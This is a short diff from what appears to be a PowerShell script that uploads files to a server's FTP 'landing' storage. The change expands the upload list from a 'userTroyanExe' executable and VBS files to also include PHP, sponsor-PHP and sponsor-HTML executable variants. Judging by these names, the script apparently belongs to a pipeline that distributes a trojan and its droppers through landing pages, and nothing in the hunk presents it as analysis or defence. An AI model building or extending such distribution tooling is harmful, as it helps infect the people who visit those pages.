@@ -23,7 +23,10 @@ if ($server.landingAuto -eq $false)
 
 $ftpStorage=$server.landingFtp
 
-$files = @($server.userTroyanExe, $server.userVbsFile, $server.userPhpVbsFile, $server.userSponsorPhpVbsFile, $server.userSponsorHtmlVbsFile)
+$files = @(
+$server.userTroyanExe, $server.userPhpExeFile, $server.userSponsorPhpExeFile, $server.userSponsorHtmlExeFile
+$server.userVbsFile, $server.userPhpVbsFile, $server.userSponsorPhpVbsFile, $server.userSponsorHtmlVbsFile
+)
 
 $landingName = $server.landingName
 
